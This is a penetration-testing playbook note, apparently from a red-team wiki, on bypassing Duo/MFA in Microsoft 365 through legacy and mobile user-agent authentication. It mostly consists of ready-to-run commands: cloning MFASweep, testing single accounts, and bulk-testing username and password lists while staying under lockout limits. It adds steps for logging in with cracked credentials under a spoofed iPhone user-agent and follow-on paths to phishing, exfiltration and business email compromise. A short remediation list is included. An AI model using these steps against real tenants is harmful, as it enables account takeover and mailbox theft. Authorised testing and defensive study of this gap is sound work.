# MFA Bypass via Legacy Authentication (M365 / O365)

**MITRE:** [T1556 - Modify Authentication Process](https://attack.mitre.org/techniques/T1556/)  
**Phase:** Credential Access / Defense Evasion  
**Auth Required:** Yes (valid username + password)  
**Tags:** #credential-access #mfa-bypass #m365 #legacy-auth #duo #mfasweep

---

## Summary
Even when MFA (e.g., Duo) is enforced on web login flows, legacy authentication endpoints and mobile user-agent flows often bypass MFA entirely. With confirmed valid credentials, use MFASweep to identify which M365/O365 endpoints are accessible without a second factor.

## Mechanism
- **Protocol:** HTTPS to Microsoft authentication endpoints
- **Function:** Tests multiple M365 auth flows for MFA enforcement gaps
- **Effect:** Identifies endpoints where password alone grants access — bypassing Duo/MFA

## Commands
```bash
# Install PowerShell on Kali
sudo apt install -y powershell

# Clone MFASweep
git clone https://github.com/dafthack/MFASweep
cd MFASweep

# Single account test
pwsh -c "Import-Module ./MFASweep.ps1; Invoke-MFASweep -Username user@domain.com -Password 'Summer2023!'"

# Bulk loop with output capture
pwsh << 'EOF' 2>&1 | tee mfasweep_results.txt
Import-Module ./MFASweep.ps1

$users = Get-Content ./usernames.txt   # UPN format: user@domain.com
$passes = Get-Content ./passwords.txt

for ($i = 0; $i -lt $users.Count; $i++) {
    Write-Host "`n=== Testing: $($users[$i]) ===" -ForegroundColor Cyan
    Invoke-MFASweep -Username $users[$i] -Password $passes[$i]
    Start-Sleep -Seconds 2
}
EOF

# Ensure UPN format (add domain suffix if needed)
sed 's/$/@domain.com/' usernames.txt > upn_usernames.txt
```

## Expected Output
```
[*] Microsoft Graph API          - Single Factor Access: No
[*] Azure AD                     - Single Factor Access: No
[*] Exchange Web Services (EWS)  - Single Factor Access: No
[*] ActiveSync                   - Single Factor Access: No
[*] M365 w/ iPhone UA            - Single Factor Access: Yes   ← FINDING

Primary authentication to the M365 web portal succeeded.
It appears there is no MFA required for this account.
Note: login with a web browser using UA: Mozilla/5.0 (iPhone; CPU iPhone OS 18_3...)
```

## Notes
- **Single Factor Access: Yes** = authenticated without MFA prompt — finding confirmed
- **Single Factor Access: No** = MFA working correctly on that endpoint
- Wrong password returns No, not an error — a Yes result confirms valid credential
- Azure AD Smart Lockout default = 10 failed attempts; testing confirmed valid creds = 1 attempt per endpoint, well under threshold
- MFASweep has no built-in output file — always pipe to `tee`
- 3/3 same result = systemic tenant-wide gap, not per-account misconfiguration; stop at ~3 for representative sample

## Proof of Exploitation
To demonstrate access without MFA:
1. Install Firefox extension: "User Agent Switcher and Manager"
2. Set UA to: `Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/605.1.15`
3. Navigate to `https://outlook.office365.com`
4. Login with cracked credential
5. Screenshot: inbox loads with no Duo prompt

## Relay / Follow-On Attack Path
- Full O365 access (email, calendar, Teams, OneDrive) without MFA
- Pivot to internal phishing, data exfiltration, BEC

## Remediation
- Enable Azure AD Conditional Access — block legacy authentication protocols entirely
- Configure Duo to enforce on mobile auth flows, not just browser/modern auth
- Enable "Block Legacy Authentication" baseline policy in Azure AD
- Monitor Azure AD sign-in logs for mobile UA auth events

## Related
- [[ntds-account-mapping]]
- [[ntlm-hash-cracking]]
- [[domain-password-policy]]
